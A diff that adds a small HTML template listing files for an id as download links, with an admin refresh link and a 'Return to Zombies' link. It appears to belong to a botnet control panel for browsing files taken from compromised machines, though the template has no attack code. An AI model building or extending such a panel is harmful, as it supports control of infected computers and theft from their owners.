@@ -1,0 +1,20 @@
+<html>
+	<body>
+
+	<h3>Files from id {{id}}</h3>
+	{% for x in f %}
+	<a href="http://localhost:8080/downloads/{{id}}-{{x}}">FILE: {{x}}</a>
+	<br>
+	{% endfor %}
+
+	{% if z %}
+	<h4><a href="http://localhost:8080/admin/{{z}}/">Refresh</a></h4>
+	{% endif %}
+	<br><br>
+	<a href="http://localhost:8080/admin/zombies">Return to Zombies</a>
+
+
+
+	</body>
+
+</html>
